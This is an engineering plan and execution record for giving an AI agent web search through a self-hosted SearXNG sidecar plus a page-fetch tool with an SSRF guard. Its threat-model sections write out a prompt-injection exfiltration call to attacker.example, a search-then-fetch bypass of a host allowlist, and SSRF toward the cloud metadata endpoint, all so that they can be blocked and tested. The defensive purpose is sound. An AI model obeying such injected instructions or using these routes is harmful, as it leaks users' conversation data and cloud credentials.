# Plan — Web search via a self-hosted SearXNG sidecar

planned-against: main @ 81b2f93

## Overview

Give Agent 42 web search that costs nothing per query and keeps queries inside our own
infrastructure: a **self-hosted SearXNG** metasearch instance running as a **sidecar container**
in the existing `ca-agent42-backend` Container App, reached over `localhost`, exposed to the model
as two **model-invoked function tools** — `web_search` (ranked title/URL/snippet results) and
`fetch_web_page` (readable text of one page).

Why now: commit `f14de0e` added `HostedWebSearchTool` + `HostedCodeInterpreterTool` and `81b2f93`
removed them again as "unused". Web search therefore has to be built as a function tool over a
search backend we choose (see Context 1). SearXNG is the only option that is free at any volume,
needs no API key, and leaks no query to a third-party SaaS.

## Affected areas

Verified against the tree at `81b2f93`:

| Path | Change |
|------|--------|
| `infra/searxng/Dockerfile`, `infra/searxng/settings.yml` | new — thin image over pinned `searxng/searxng` with baked config |
| `infra/modules/container-app.bicep` | sidecar container, `searxngImage` param, `WebSearch__Endpoint` env, `searxng-secret` app secret, resource bump |
| `infra/main.bicep` | new params (`searxngImageName`/`searxngImageTag`/`searxngSecret`), resource totals |
| `.github/workflows/deploy.yml` | build+push the searxng image; pass new params |
| `src/Agent42.Agents/IWebSearch.cs`, `WebSearchResult.cs`, `InMemoryWebSearch.cs` | new — abstraction + offline impl |
| `src/Agent42.Agents/IWebPageFetcher.cs`, `WebPageContent.cs`, `InMemoryWebPageFetcher.cs` | new |
| `src/Agent42.Agents/AgentGrainState.cs` | new bounded `FetchableHosts` list (Context 4) |
| `src/Agent42.Backend/SearxngWebSearch.cs` | new — prod search over a named HttpClient |
| `src/Agent42.Backend/WebPageFetcher.cs`, `src/Agent42.Backend/PrivateAddressGuard.cs` | new — fetch + SSRF guard |
| `src/Agent42.Agents/AgentGrain.cs` | register the two tools (line 123 `Tools` array) |
| `src/Agent42.Agents/Skills/websearch/SKILL.md` | new — when-to-search / how-to-cite guidance |
| `src/Agent42.Backend/Program.cs`, `appsettings.json` | DI + `WebSearch` config + eager validation |
| `Directory.Packages.props`, `src/Agent42.Backend/Agent42.Backend.csproj` | the new HTML-parser dependency (CPM — `ManagePackageVersionsCentrally=true`) |
| `tools/Agent42.DevHost/Program.cs`, `tools/Agent42.DevHost/CannedChatClient.cs` | register the in-memory impls; make the canned client able to call `web_search` |
| `src/Agent42.AppHost/AppHost.cs` | `AddDockerfile` the searxng image, wire its URL to the backend |
| `tests/Agent42.Tests/` | new test files + `FakeChatClient` trigger + `TestSiloConfigurator` registration |
| `.agentic/decisions/0011-*.md`, `.agentic/gotchas.md`, `CLAUDE.md` | doc debt (Step 10) |

**Not** changing: `src/Agent42.Agents/Agent42.Agents.csproj` — it already globs
`<Content Include="Skills\**\*">` (line 22), so a new skill folder is copied to output with no edit.
`wwwroot/app.js` — it renders tool chips generically by name, so the two new tools appear with no
frontend change.

## Context & constraints

Findings the executor cannot cheaply re-derive. **Read these before touching the area.**

1. **Hosted tools did not work here — and *why* is unverified, so Step 1 settles it.**
   `AzureOpenAIChatClientFactory.Build` (`src/Agent42.Backend/ChatClientFactory.cs:36-41`) calls
   `GetChatClient(deployment).AsIChatClient()` — the **Chat Completions** API, whereas
   `HostedWebSearchTool` is designed to execute server-side on OpenAI's **Responses** API. The
   *presumption* is that on chat completions it is silently ignored, which would explain `81b2f93`
   ("remove unused tools"). But neither commit records a diagnosis, and this plan's whole rationale
   rests on it — so **Step 1 verifies it against the real deployment** rather than asserting it.
   If it turns out chat completions *does* honour it, stop and re-plan: this design is displaced.

2. **The 2 MB session cap is the sharpest edge in this plan (ADR 0004).** Function call/result
   messages **are persisted**: `AgentGrain.cs:139-142` filters only `AIContextProvider` and
   `ChatHistory` source types out of storage (`AgentGrain.cs:167-182`), so a `FunctionResultContent`
   stays in chat history, and `AgentGrain.cs:356-358` re-serializes the whole session into **one
   `agent-state` Cosmos item every turn** — which Cosmos hard-caps at **2 MB** (ADR 0004, and the
   gotcha "Image attachment bytes must stay out of the session"). A fetched page returned verbatim
   would sit in history forever, be re-serialized every later turn, and be re-sent to the model every
   turn; two fetches would exceed the cap and `WriteStateAsync` would then fail *after* the model had
   already replied — bricking the conversation, silently, in prod only.
   **Therefore: what the tools RETURN is budgeted, not just what they download.** `fetch_web_page`
   returns **≤ 8 KB** of extracted text (truncated, with a marker); `web_search` returns **≤ 5
   results × ≤ 300-char snippets**. The ~1 MB HTTP read cap in Step 5 is a *transport* guard and is
   not the same number — do not conflate them. The same value is streamed to the browser as a tool
   chip (`AgentGrain.cs:344` → `app.js appendToolIo`), so the cap protects the DOM too.

3. **`fetch_web_page` is an SSRF sink with a model-chosen URL.** The container app has a
   **system-assigned managed identity** with Cosmos, Storage and Azure OpenAI rights, and Azure's
   IMDS endpoint (`169.254.169.254`) will mint tokens for it to anything that can make an HTTP
   request from inside the container. The guard is not a formality — treat a missing guard test as a
   failing step.
   **Resolve-then-request is not a real defence** (TOCTOU): validating the hostname's DNS answer and
   then handing the *hostname* to `HttpClient` lets the socket resolve a second time, and the
   attacker's second answer is `169.254.169.254`. The check must run on the address actually being
   connected to — `SocketsHttpHandler.ConnectCallback` — which also covers every redirect hop for free.

4. **Prompt-injection exfiltration is in scope, and constrains the fetch tool's design.** Once a
   fetched page's text is in context, an instruction *on that page* can tell the model to call
   `fetch_web_page("https://attacker.example/?q=<conversation text>")` — a clean exfil channel out of
   a conversation that may also carry document excerpts (ADR 0008). The SSRF guard cannot help: it
   allows all public URLs by construction. **Decision (user, at plan time):** `fetch_web_page` accepts
   a URL only if its **host** already appeared either in a `web_search` result of this conversation
   or in one of the **user's own messages** in it. `attacker.example` appears in neither, so the
   channel is closed, while "read this link I pasted" still works. The host allowlist is a small
   bounded list in `AgentGrainState`. Residual risk (an injected page hosted on a domain that *did*
   come back from a search) is accepted and stated in ADR 0011.

5. **Port 8080 collides.** SearXNG defaults to 8080 and so does the backend's ingress `targetPort`
   (`infra/modules/container-app.bicep:106`). Containers in one Container App share a network
   namespace and talk over `localhost`, so the sidecar **must** move off 8080 — pinned to **8888**.

6. **SearXNG returns JSON only if you turn it on — otherwise HTTP 403.** Only `html` is active by
   default; the API needs `search: { formats: [html, json] }` in `settings.yml`. Requesting an unset
   format returns **403 Forbidden**, which reads like an auth failure and is the most likely way this
   integration "mysteriously" fails. ([SearXNG search API docs](https://docs.searxng.org/dev/search_api.html))

7. **Container Apps bills per-replica totals, and the CPU/memory sum across containers must land on
   an allowed combination.** Today the single `backend` container is `0.5 CPU / 1Gi`
   (`infra/main.bicep:101-104`). Adding the sidecar makes the replica total `1.0 CPU / 2Gi` (backend
   unchanged + searxng `0.5/1Gi`) — roughly **doubles the app's compute cost**; the user accepted
   this at plan time. Replicas stay pinned at 1 (Orleans localhost clustering,
   `@minValue(1) @maxValue(1)`), so there is exactly one SearXNG per deployment.

8. **Config is baked into a thin image, not mounted.** `search.formats` lives in the `search:`
   section, which the container's `SEARXNG_*` env overrides do **not** reliably cover (they target
   `server`/`general`), and mounting a `settings.yml` in ACA would need an Azure Files volume. So we
   build `infra/searxng/Dockerfile` (`FROM searxng/searxng:<pinned>` + `COPY settings.yml`) and push
   it to ACR next to the backend image.

9. **Never carry identity on the outbound call via `Activity.Baggage` (ADR 0010).** The default
   `DistributedContextPropagator` injects a W3C `baggage` header on outbound `HttpClient` calls,
   which would ship `user.email`/`user.full_name`/`user.roles` to whatever host `fetch_web_page`
   reads. `RequestContext` is the only identity channel here, and
   `NoBaggageWriteApi_IsUsedInTelemetryPath` already guards it — keep it green.

10. **HttpClient resilience and tracing come for free — but pin the timeouts.**
    `AddServiceDefaults()` (`src/Agent42.ServiceDefaults/Extensions.cs:33-40`) applies
    `AddStandardResilienceHandler()` + `AddServiceDiscovery()` + OTel HTTP instrumentation to **all**
    HttpClients via `ConfigureHttpClientDefaults`, so a named client inherits retries, timeouts and
    spans — do not hand-roll a retry policy. But `AgentGrain` is **non-reentrant**: a slow
    search→fetch chain serializes the conversation's turn and delays the first `TextDelta`, and
    retries multiply it. Set **explicit per-attempt and total timeouts** on both named clients rather
    than inheriting the standard handler's defaults, and record the latency consequence in ADR 0011.
    (Outbound HTTP *from* the grain is the established pattern here — the chat client and embedding
    generator already do it inside `ChatAsync` (ADR 0001) — so this is not an architectural
    deviation, only a latency one.) DevHost deliberately does not call `AddServiceDefaults` (ADR
    0002); it uses the in-memory impls, so this does not apply there.

11. **Guidance goes in an Agent Skill, not the system prompt.** A bound persona *replaces*
    `Instructions` (ADR 0003), so tool guidance appended there would vanish for agent chats. The
    canonical shape is a progressive-disclosure skill —
    `src/Agent42.Agents/Skills/scheduledprompt/SKILL.md`, surfaced by `AgentSkillsProvider`
    (`AgentGrain.cs:108-110`) — which is persona-independent. **No `.csproj` change is needed**: the
    `Skills\**\*` glob (`Agent42.Agents.csproj:22`) already copies it to output.

12. **This does not contradict ADR 0008.** ADR 0008 chose *always-on* `TextSearchProvider` retrieval
    over an on-demand tool, explicitly rejecting `OnDemandFunctionCalling`. That is scoped to
    **document** retrieval, where the corpus is small, local, free to query and known to be relevant.
    The web is the inverse: querying it every turn would hit the network for "hi", inject noise, and
    slow every reply. Model-invoked tools are right here, and ADR 0011 must state this distinction
    explicitly so it does not read as a silent reversal.

13. **Manual prerequisite (user, not the agent).** A `SEARXNG_SECRET` GitHub Actions secret must
    exist before the first deploy of this branch (any long random string): GH secret → Bicep
    `@secure()` param → ACA app secret → sidecar env. Same class of manual prereq as the embedding
    deployment.

## Step 1 results (executed 2026-07-12 — the gate is GREEN)

**(a) The premise holds, and is sharper than presumed.** `HostedWebSearchTool` on `ChatOptions`
through the real `AzureOpenAIClient(...).GetChatClient("gpt-4o").AsIChatClient()` is **not silently
ignored** — it is a hard failure:

```
System.ClientModel.ClientResultException: HTTP 400 (invalid_request_error)
Parameter: web_search_options
Web search options not supported with this model.
```

`Microsoft.Extensions.AI` maps `HostedWebSearchTool` onto the chat-completions `web_search_options`
request parameter, which `gpt-4o` rejects. A control call with no tools on the same client returned
200. So `f14de0e` would have made **every chat 400**, which is why `81b2f93` reverted it 25 minutes
later. The design is **not** displaced — proceed.

**(b) Resolved base tag: `searxng/searxng:2026.7.12-c19d86faa`** — the immutable tag whose digest
(`sha256:f433294b…`) equals today's `latest`. Steps 2, 7 and 9 pin this.

Baked image, run with `SEARXNG_PORT=8888`: `GET /search?q=orleans+framework&format=json` →
**HTTP 200**, `results` array of 10 with `title`/`url`/`content`. AC1 met.

**Deviation found — `server.port` in `settings.yml` does not move the bind.** The image's entrypoint
does `export GRANIAN_PORT="${SEARXNG_PORT:-$GRANIAN_PORT}"`, so the listener is driven by the
**`SEARXNG_PORT` env var**; with only `server.port: 8888` in the config the container still listened on
**8080** — the exact collision Context 5 exists to prevent. The port move therefore lives in the env
(Step 8 already passes `SEARXNG_PORT=8888`), not in `settings.yml`.

**Context 6 confirmed by experiment:** the same image with `json` removed from `search.formats`
returns **HTTP 403** for `?format=json` while `?format=html` returns 200 on that same instance.

## Steps

### Step 1 — Spike: settle the premise, and prove the image (gate for everything else)
Outside the repo tree. Two things:
(a) **Verify Context 1** — send a `HostedWebSearchTool` on a `ChatOptions` through the real
Azure OpenAI chat-completions client and record what actually happens (ignored / 400 / honoured).
If it is honoured, **stop and re-plan** — this design is displaced.
(b) Resolve the **current stable `searxng/searxng` tag from the registry** (hard rule 4 — never a
version from memory), build a throwaway image with the Step-2 `settings.yml`, run it, and confirm
`curl 'http://localhost:8888/search?q=test&format=json'` returns 200 with a `results` array (not
403), limiter off, listening on 8888.
**Verify:** paste both outputs. Record the resolved base tag in this spec — Steps 2, 7 and 9 pin it.

### Step 2 — The SearXNG image  *(parallelizable with Steps 3–5)*
`infra/searxng/Dockerfile` (`FROM searxng/searxng:<tag from Step 1>`, `COPY settings.yml`) and
`infra/searxng/settings.yml`: `search.formats: [html, json]`, `server.limiter: false`,
`server.port: 8888`, `server.bind_address: 0.0.0.0`, a conservative engine set, `safe_search: 1`.
No secret in the file — it arrives as `SEARXNG_SECRET` at runtime.
**Verify:** `docker build infra/searxng` succeeds; Step 1(b)'s curl passes against it.

### Step 3 — Abstractions in `Agent42.Agents`
`IWebSearch` (`Task<IReadOnlyList<WebSearchResult>> SearchAsync(string query, int maxResults, CancellationToken)`),
`WebSearchResult(string Title, string Url, string Snippet)`, `IWebPageFetcher`
(`Task<WebPageContent> FetchAsync(string url, CancellationToken)`), `WebPageContent`, plus
`InMemoryWebSearch` / `InMemoryWebPageFetcher` returning fixed canned data. Follow the interface +
prod + in-memory split of `IDocumentIndex.cs` / `IAttachmentStore.cs` — including the `InMemory*`
naming and the XML doc that names both impls.
**Verify:** `dotnet build Agent42.slnx`.

### Step 4 — `SearxngWebSearch` (prod search)  *(parallelizable with Step 5)*
`src/Agent42.Backend/SearxngWebSearch.cs`: named `HttpClient` with **explicit timeouts** (Context 10),
`GET {endpoint}/search?q={query}&format=json&safesearch=1`, parse `results[]` into `WebSearchResult`,
**cap at 5 results, snippets at 300 chars** (Context 2). A non-200 — notably **403 = JSON format not
enabled** (Context 6) — must surface a message naming that cause; the next person to hit this should
not have to rediscover it.
**Verify:** new `tests/Agent42.Tests/SearxngWebSearchTests.cs` — canned JSON through a stub
`HttpMessageHandler`: results map, `format=json` is on the query string, result count and snippet
length are capped, a 403 names the format cause. `dotnet test`.

### Step 5 — `fetch_web_page` + SSRF guard  *(security-critical — Context 3)*
`src/Agent42.Backend/PrivateAddressGuard.cs`: reject non-`http(s)` schemes; reject any address that is
loopback, link-local (**incl. `169.254.169.254` IMDS**), private (10/8, 172.16/12, 192.168/16),
CGNAT (100.64/10), `0.0.0.0/8`, IPv4-mapped IPv6 (`::ffff:127.0.0.1`), unique-local IPv6 (`fc00::/7`),
`::1`, or multicast.
`src/Agent42.Backend/WebPageFetcher.cs`: enforce the guard in **`SocketsHttpHandler.ConnectCallback`**,
so the check runs on the IP actually connected to and covers every redirect hop (Context 3 — a
resolve-then-request check is TOCTOU-broken and must not be what ships). `Content-Type` restricted to
`text/html`/`text/plain`; HTTP read capped ~1 MB; **returned text capped at 8 KB** with a truncation
marker (Context 2); short timeout; HTML→readable text via an HTML parser added with
`dotnet add package <parser>` (latest stable, pinned in `Directory.Packages.props` — hard rule 4).
**Verify:** new `tests/Agent42.Tests/PrivateAddressGuardTests.cs` + `WebPageFetcherTests.cs` — see
AC5–AC10. `dotnet test`.

### Step 6 — Wire the tools into the grain
`AgentGrain.cs`: inject `IWebSearch` + `IWebPageFetcher`; add `web_search` and `fetch_web_page` to the
`Tools` array (line 123) via `AIFunctionFactory.Create`, following the existing
`schedulePrompt`/`getDateTime` shape (`[Description]` on every parameter). Implement the **host
allowlist** (Context 4): `web_search` records each result's host into a bounded `FetchableHosts` list
in `AgentGrainState`, the user's own message text contributes any hosts it contains, and
`fetch_web_page` refuses a host that is in neither — returning a message telling the model to search
for it first. Add `src/Agent42.Agents/Skills/websearch/SKILL.md` (Context 11 — no csproj change).
Extend `FakeChatClient.SelectToolCall` **and** `tools/Agent42.DevHost/CannedChatClient.cs` with a
`web_search` trigger — **respect the ordering comment at `FakeChatClient.cs:170`** and pick a trigger
word that cannot collide with the `cancel`/`remind` branches (e.g. `"look up"`). Register the
in-memory impls in `TestSiloConfigurator`.
**Verify:** new tests in `AgentGrainTests.cs` — AC11–AC14. `dotnet test`.

### Step 7 — Composition: Program.cs, DevHost, AppHost
`Program.cs`: bind `WebSearch:Endpoint`, **eager-validate at startup** (mirror the
`EmbeddingDeploymentName` check at `Program.cs:91-98` — a missing value throws before the first chat,
not during one), register both named HttpClients + `SearxngWebSearch` + `WebPageFetcher`.
`appsettings.json`: a `WebSearch` section. `tools/Agent42.DevHost/Program.cs`: register
`InMemoryWebSearch`/`InMemoryWebPageFetcher`. `src/Agent42.AppHost/AppHost.cs`:
`AddDockerfile("searxng", "../../infra/searxng")` with an HTTP endpoint on 8888, `.WithReference` +
`.WaitFor` from the backend, and pass its URL as `WebSearch__Endpoint`.
**Verify:** `dotnet run --project tools/Agent42.DevHost` starts with no Docker/network and a "look
up …" prompt renders a `web_search` tool chip (AC15); `dotnet build Agent42.slnx`.

### Step 8 — Bicep: the sidecar
`container-app.bicep`: params `searxngImage`, `searxngCpu`, `searxngMemory`, `@secure() searxngSecret`;
a `searxng-secret` app secret; the second container in `template.containers` with `SEARXNG_SECRET`
(secretRef), `SEARXNG_BASE_URL`, `SEARXNG_PORT=8888`; and `WebSearch__Endpoint=http://localhost:8888`
on the **backend** container. `main.bicep`: plumb the params; split resources so the replica total is
`1.0 CPU / 2Gi` (Context 7). **No new ingress** — the sidecar is unreachable from outside by
construction, and Easy Auth still fronts the only exposed port (ADR 0002 unweakened).
**Verify:** `az deployment group validate -g rg-agent42 -f infra/main.bicep …`, or `az bicep build` if
no Azure login is available — say which was actually run.

### Step 9 — Deploy workflow
`deploy.yml`: build + push `infra/searxng` to ACR as `agent42-searxng:<sha>` alongside the backend
image; pass `searxngImageTag` + `searxngSecret: ${{ secrets.SEARXNG_SECRET }}` to the Bicep step.
**Verify:** YAML parse + read-through. This step is **verified by inspection, not execution** (the
workflow only truly runs on `main`) — report it that way.

### Step 10 — Doc debt (same MR — hard rule 2)
ADR `0011-web-search-self-hosted-searxng-sidecar.md`: the decision; the rejected alternatives (OpenAI
hosted tool on the Responses API / Tavily / Brave / separate internal container app / always-on
retrieval); the ADR-0008 distinction (Context 12); the **accepted residual prompt-injection risk**
(Context 4); and the pinned timeouts + latency consequence (Context 10).
`.agentic/gotchas.md`: SearXNG-JSON-403; the 8080 collision; the ACA per-replica resource sum; the
IMDS/`ConnectCallback` constraint; and **tool results count against the 2 MB session cap** (Context 2
— the one most likely to bite a future tool author).
`CLAUDE.md`: a repo-notes bullet + the `SEARXNG_SECRET` manual prereq.
**Verify:** `/audit-docs` clean on the touched claims.

## Acceptance criteria → test mapping

| # | Acceptance criterion | Test | File |
|---|----------------------|------|------|
| AC1 | Baked image serves the JSON API (not 403) | Step 1(b) spike curl — **manual**, no Docker in CI | — |
| AC2 | A SearXNG JSON payload maps to `WebSearchResult`s | `Search_MapsResults` | `SearxngWebSearchTests.cs` |
| AC3 | `format=json` is always sent | `Search_RequestsJsonFormat` | `SearxngWebSearchTests.cs` |
| AC4 | Results capped at 5, snippets at 300 chars | `Search_CapsResultsAndSnippets` | `SearxngWebSearchTests.cs` |
| AC5 | A 403 surfaces "JSON format not enabled" as the cause | `Search_On403_ExplainsJsonFormatNotEnabled` | `SearxngWebSearchTests.cs` |
| AC6 | The guard blocks IMDS, loopback, link-local, private v4, CGNAT, ULA v6, v4-mapped v6 | `Rejects_ImdsAddress`, `Rejects_Loopback`, `Rejects_PrivateRanges`, `Rejects_Cgnat`, `Rejects_UniqueLocalIpv6`, `Rejects_Ipv4MappedLoopback` | `PrivateAddressGuardTests.cs` |
| AC7 | A public address is allowed | `Allows_PublicAddress` | `PrivateAddressGuardTests.cs` |
| AC8 | The guard runs at **connect** time, on the IP actually dialled — not on a pre-resolved hostname (TOCTOU) | `Fetch_ValidatesAddressAtConnectTime`, `Fetch_RedirectToPrivateAddress_IsBlocked` | `WebPageFetcherTests.cs` |
| AC9 | Oversized / wrong-content-type responses are capped or rejected | `Fetch_CapsResponseSize`, `Fetch_RejectsNonTextContentType` | `WebPageFetcherTests.cs` |
| AC10 | HTML is reduced to readable text, returned text ≤ 8 KB with a truncation marker | `Fetch_ExtractsReadableText`, `Fetch_TruncatesReturnedTextTo8Kb` | `WebPageFetcherTests.cs` |
| AC11 | `web_search` results reach the model | `WebSearch_ToolResultReachesTheModel` | `AgentGrainTests.cs` |
| AC12 | `fetch_web_page` works for a host that came from a search result | `FetchWebPage_AllowsHostFromSearchResult` | `AgentGrainTests.cs` |
| AC13 | `fetch_web_page` **refuses** a host that appeared in neither a search result nor a user message (exfil channel closed — Context 4) | `FetchWebPage_RefusesUnknownHost` | `AgentGrainTests.cs` |
| AC14 | A tool-heavy conversation does not blow the session budget: after a search + fetch, the serialized session stays under a stated KB ceiling (ADR 0004 — Context 2) | `ToolResults_DoNotBlowTheSessionSizeBudget` | `AgentGrainTests.cs` |
| AC15 | The `websearch` skill reaches the model (its catalog entry appears in the delivered instructions) | `WebSearchSkill_IsAdvertisedToTheModel` (via `FakeChatClient`'s `[sys:…]` echo — the exemplar for this is the bound-persona gotcha) | `AgentGrainTests.cs` |
| AC16 | No `Activity.Baggage` write creeps into the outbound path (ADR 0010) | `NoBaggageWriteApi_IsUsedInTelemetryPath` (**existing** — must stay green) | `UserTelemetryTests.cs` |
| AC17 | Offline DevHost still starts with no Docker and no network, and shows a `web_search` chip | Step 7 — **manual** run | — |

**AC1 and AC17 are not covered by the automated suite** (no Docker in the test harness; no host runner
— `UserTelemetryTests.cs:11` records that the repo has no `WebApplicationFactory`/`Mvc.Testing`). The
same limitation means **Step 7's eager `WebSearch:Endpoint` validation is not unit-testable** — it is
verified by the DevHost/AppHost run, not by a test. Report all three with their actual output; never
as "passing tests".

## Quality gate checklist

Copied from `.agentic/quality-gates.yaml` at plan time (`81b2f93`):

- [ ] `new_issues`: **0**
- [ ] `new_security_issues`: **0**  ← Step 5 and the Context-4 allowlist are what this rides on
- [ ] `duplication_pct_max`: **3**
- [ ] `coverage_new_code_pct_min`: **80**
- [ ] `cognitive_complexity_max`: **15**
- [ ] `dependencies.vulnerable_packages`: **0** (hard block — the new HTML-parser dep)
- [ ] `dotnet test Agent42.slnx` green
- [ ] `dotnet format Agent42.slnx --verify-no-changes` clean
- [ ] Branch: `feature/web-search-searxng` + MR (never `main` — hard rule 1)

## Out of scope

- A `code_interpreter` tool (the other half of `f14de0e`) — different problem, different sandbox.
- Per-conversation or per-agent toggles for web search; it is on for every chat.
- Caching search results, or persisting fetched pages into the document index.
- Migrating the chat client to the Responses API (which would enable hosted tools) — not free, and it
  would displace this design entirely; noted in ADR 0011 as a future fork in the road.
- Fetching non-HTML resources (PDFs at a URL) — the document-upload path already covers PDFs.

## Divergences from the plan (recorded at execution, 2026-07-12)

Where the implementation departed from what was planned, and why.

| # | Plan said | What shipped | Why |
|---|-----------|--------------|-----|
| 1 | Context 1: hosted tools are *presumed* silently ignored on chat completions | They are **rejected with HTTP 400** — `Parameter: web_search_options`, "Web search options not supported with this model" | Step 1(a) measured it against the real deployment. The premise holds (hosted web search does not work on our client), but the mechanism is a hard failure, not a no-op — so `f14de0e` would have 400'd *every* chat. Recorded in ADR 0011 and CLAUDE.md; the plan's own rationale is now evidence, not presumption. |
| 2 | Step 2: `settings.yml` carries `server.port: 8888` / `bind_address` | The port moves via the **`SEARXNG_PORT` env var**; `settings.yml` carries neither | Step 1(b) found the container still listening on **8080** with `server.port: 8888` set — the image's entrypoint does `export GRANIAN_PORT="${SEARXNG_PORT:-$GRANIAN_PORT}"`, so `server.port` is inert for the bind. Left as planned, this would have shipped the exact 8080 collision Context 5 exists to prevent. Now a gotcha. |
| 3 | Caps (5 results / 300-char snippets / 8 KB page) stated per-implementation | Centralized in **`WebToolLimits`** (`Agent42.Agents`) | The caps are a contract shared by the prod impl, the in-memory impl and the tests. One source of truth stops them drifting apart, and keeps the duplication gate honest. |
| 4 | Step 5: guard tested against `PrivateAddressGuard` | Guard policy is a **`Func<IPAddress,bool>` parameter** of `WebPageFetcher.CreateHandler`, wired to `PrivateAddressGuard.IsPubliclyRoutable` in `Program.cs` | AC8 demands proof the guard fires **at connect time on a redirect hop**. That is untestable if loopback is unconditionally refused (the test server *is* on loopback). Injecting the policy lets the test allow loopback while still blocking IMDS, so the redirect-into-`169.254.169.254` block is genuinely exercised on a **real socket** (`TestHttpServer`). Production behaviour is unchanged. |
| 5 | Step 6: extend `FakeChatClient.SelectToolCall` with a `web_search` trigger | Also added a **`[tool:…]` result echo** to `FakeChatClient` | AC11 says the search results must reach *the model*. Asserting the tool ran only proves plumbing. The echo follows the repo's existing `[sys:…]`/`[ctx:…]` discipline for proving delivery. |
| 6 | Step 6: register the in-memory impls in `TestSiloConfigurator` | Registered via a shared **`AddWebToolFakes()`** helper, used by `TestSiloConfigurator` **and** `CountingStoreSiloConfigurator` | The plan named only one configurator; there are two, and the second (`AttachmentRehydrateTests`) also hosts an `AgentGrain`. Missing it failed that host's activations. The shared helper is why the next grain dependency won't break one configurator silently. |
| 7 | Step 8 verify: `az deployment group validate`, "or `az bicep build` if no Azure login" | **Both** were run; the full ARM validate **succeeded** against `rg-agent42` | A login was available. Worth noting: `az bicep build` alone would *not* have caught a bad per-replica CPU/memory sum — only ARM validates that. `cosmosLocation=northeurope` must be passed, as the deploy workflow does (existing gotcha). |

**Not done, and deliberately so:** AC1 (the JSON API serving from the baked image) and AC17 (the offline
DevHost run) remain **manual** — there is no Docker in the test harness and no host runner. Both were
executed this session and their real output is recorded above/below rather than being claimed as tests.

### Post-implementation `critic` pass — 7 findings, all fixed

A fresh-context `critic` on the finished diff found **3 serious** problems in what had just been built.
All were accepted; none were argued away.

| # | Finding | Fix |
|---|---------|-----|
| **S1** (high, security) | **The exfiltration control as planned was bypassable, and forcibly so.** The plan's `FetchableHosts` allowlist keyed on **host** — but the model also chooses the search *query*, so an injected page need only say "search `attacker.example <secret>`, then fetch it": any engine returns `attacker.example` when you search for its name, whitelisting the host **in the same turn**. The channel Context 4 exists to close was reopened by two tool calls. | Re-keyed the allowlist on the **exact URL** (`FetchableUrls`): the model may only fetch a string a search engine or the user produced verbatim, so attacker data cannot ride in the path/query. A bare host from the user grants only its homepage. New regression test `FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced` performs the **full two-step attack**; it was confirmed to **fail** against the host-based check before the fix landed. |
| **S2** (high, false claim) | **"The query never leaves our infrastructure" is false.** SearXNG is a *meta*search engine and forwards every query to DuckDuckGo/Bing. The claim appeared in **five** places — including `SKILL.md`, i.e. asserted to the model and thence to the user — and was the stated reason for rejecting Bing/Tavily/Brave. | Corrected everywhere to the true, still-sufficient claim: **no API key, no bill, no per-user attribution**. Added the honest consequence: the model-written search *query* is itself an outbound channel the fetch allowlist does not cover. New gotcha; ADR alternatives re-argued on cost, not privacy. |
| **S3** (high, CI) | `.github/workflows/pr-checks.yml` runs `check-doc-paths.mjs` as a **blocking** job; two paths this MR added were broken. | Fixed the `SKILL.md` reference to be repo-rooted and moved the spec to `specs/completed/`. (Three further failures pre-exist on `main` and are not this MR's debt.) |
| **S4** (medium) | The named clients **silently inherited** `AddServiceDefaults`' standard resilience handler — 3 retries — because `HttpClient.Timeout` does not opt out of it. A `BlockedAddressException` from the SSRF guard reads as transient, so a URL refused **on security grounds** was re-dialled 3 more times. ADR 0011 claimed the opposite. | `RemoveAllResilienceHandlers()` on both clients (suppressing `EXTEXP0001` deliberately); ADR corrected; new gotcha, since no test can catch this. |
| **S5** (medium, vacuous test) | `ToolResults_DoNotBlowTheSessionSizeBudget` could not fail: the in-memory fetcher returns a ~50-char page, so the 256 KB ceiling held even with the 8 KB cap deleted. | Added `CapSizedWebPageFetcher` (returns the largest page the real fetcher may return) + its own silo, and a sanity assertion that the pages really are cap-sized. The ceiling now binds on `WebToolLimits`. |
| **S6** (medium, ops) | An absent `SEARXNG_SECRET` expands to an **empty string** → crash-looping sidecar → and since ACA gates revision health on *every* container, **the backend never goes healthy either**. The sidecar is now on the availability path; nothing said so. | `@minLength(16)` on the Bicep param (fails at deployment validation, not in prod); consequence spelled out in ADR + CLAUDE.md. |
| **S7** (low) | `PrivateAddressGuard` missed IPv4-**compatible** IPv6 (`::169.254.169.254`) and NAT64 (`64:ff9b::a9fe:a9fe`) — both can spell IMDS. | Both filtered; tests added, including a NAT64 *public* address to prove the check isn't just "reject v6".

## Review

A `critic` pass (fresh context, against the repo's knowledge files) returned **3 blockers + 7
findings**. All were accepted and folded in:

| Finding | Resolution |
|---------|------------|
| **S1 (blocker)** — ADR 0004 unmentioned; a ~1 MB fetch result persists into the 2 MB session and bricks the conversation | **Fixed.** Context 2 rewritten around it; tool *return* values now budgeted (8 KB / 5×300 chars) separately from the transport cap; AC14 + `ToolResults_DoNotBlowTheSessionSizeBudget` added; gotcha added in Step 10. |
| **S2 (blocker, security)** — prompt-injection exfil via a model-chosen fetch URL was outside the threat model | **Fixed.** Raised with the user, who chose the host-provenance allowlist (search-result hosts + hosts in the user's own messages). Context 4, Step 6, AC12–AC13; residual risk recorded in ADR 0011. |
| **S3 (blocker, security)** — resolve-then-request guard is TOCTOU; the "DNS rebinding" claim was false | **Fixed.** Guard moved to `SocketsHttpHandler.ConnectCallback` (Context 3, Step 5); AC8 re-worded to assert connect-time validation; extra address classes (CGNAT, `0.0.0.0/8`, v4-mapped v6) added to AC6. |
| **S4** — `Directory.Packages.props` + `Agent42.Backend.csproj` missing from Affected areas (CPM) | **Fixed** — both added. |
| **S5** — the "copy the skill's csproj settings" instruction was wrong; `Skills\**\*` is already globbed | **Fixed** — Context 11 now says no csproj change is needed, and it is called out under Affected areas. |
| **S6** — Context 1's "hosted tools are silently dropped" was presumption, not evidence, yet the whole design rests on it | **Fixed** — demoted to an explicit presumption and promoted to Step 1(a), which verifies it against the real deployment and stops the plan if it is wrong. |
| **S7** — AC gaps: no skill AC, no session-size AC, untestable eager-validation implied as tested | **Fixed** — AC14, AC15 added; the eager-validation limitation stated alongside AC1/AC17. |
| **S8** — `Stub*` naming deviates from the `InMemory*` convention of the exemplar it cites | **Fixed** — renamed `InMemoryWebSearch` / `InMemoryWebPageFetcher`. |
| **S9** — Step 7's DevHost verify needed `CannedChatClient`, which no step touched | **Fixed** — added to Step 6 and to Affected areas. |
| **S10** (note) — grain outbound HTTP is fine, but retry/latency budget undiscussed | **Fixed** — Context 10 now requires explicit per-attempt/total timeouts and records the non-reentrancy latency consequence for ADR 0011. |

No findings were rejected.
